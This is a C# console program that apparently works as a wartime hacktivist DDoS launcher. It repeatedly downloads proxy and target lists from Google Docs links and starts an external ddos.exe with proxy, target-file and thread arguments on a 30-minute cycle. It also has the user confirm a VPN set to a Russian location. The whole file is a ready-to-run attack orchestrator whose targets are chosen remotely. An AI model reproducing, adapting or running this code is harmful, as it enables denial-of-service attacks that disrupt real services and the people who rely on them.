using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        static string proxyListLink = @"https://docs.google.com/document/d/1yB4PRmgUiWAPXDRI2Ul2eyQYZ5RCkGD1ZF4cF9WQKsw/export?format=txt";
        static string targetListLink = @"https://docs.google.com/document/d/1BMce7R52lp4AvgV3Z1Qc1NQt4uOa_zrKSOdRL7JH1_8/export?format=txt";
        static string targetPath = @"Target.txt";
        static string proxyPath = @"ProxyList.txt";

        public static void DownloadFile(string url, string path)
        {
            var client = new WebClient();
            var uri = new Uri(url);
            client.DownloadFile(uri, path);
        }
        static void Main(string[] args)
        {
            Console.WriteLine("Glory to Ukraine! Author Doure");

            int threads = 100;
            string read = "";

            while (true)
            {
                Console.WriteLine("Is Run Bright VPN Location russian? Y\\N ->");

                read = Console.ReadLine().Trim().ToUpper();

                if (!read.StartsWith("Y"))
                    continue;

                break;
            }

            while (true)
            {
                Console.WriteLine("Threads (default 100) -> ");

                read = Console.ReadLine().Trim();


                if (int.TryParse(read, out threads) == false || threads <= 0)
                    continue;

                break;
            }

            Console.WriteLine("Please don't close current window!!");

            while (true)
            {
                try
                {
                    Process[] processes = Process.GetProcessesByName("ddos");

                    foreach (Process proces in processes)
                    {
                        proces.Kill();
                    }

                    Console.WriteLine("Update Proxy..");
                    DownloadFile(proxyListLink, proxyPath);
                    Console.WriteLine("Proxy Count - " + File.ReadAllText(proxyPath).Length);

                    Console.WriteLine("Update Target..");
                    DownloadFile(targetListLink, targetPath);
                    Console.WriteLine("Target Count - " + File.ReadAllText(targetPath).Length);

                    Console.WriteLine("Auto Update from 30 min.. Please check is run VPN!");

                    Thread.Sleep(1000);

                    try
                    {
                        Process proc = new Process();
                        proc.StartInfo.UseShellExecute = true;
                        proc.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
                        proc.StartInfo.FileName = "ddos.exe";
                        proc.StartInfo.Arguments = $"--useProxy true --targetsFile Target.txt --secondsToRun 1800 --threads {threads}";
                        proc.Start();
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("Error run process - restart. Run is admin?");
                    }
       
                    Console.WriteLine("Russkij - Korabl - Idi - Naxuj. Running...");
                    Thread.Sleep(1800000);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine("FATAL ERROR!");
                }
            }
        }
    }
}
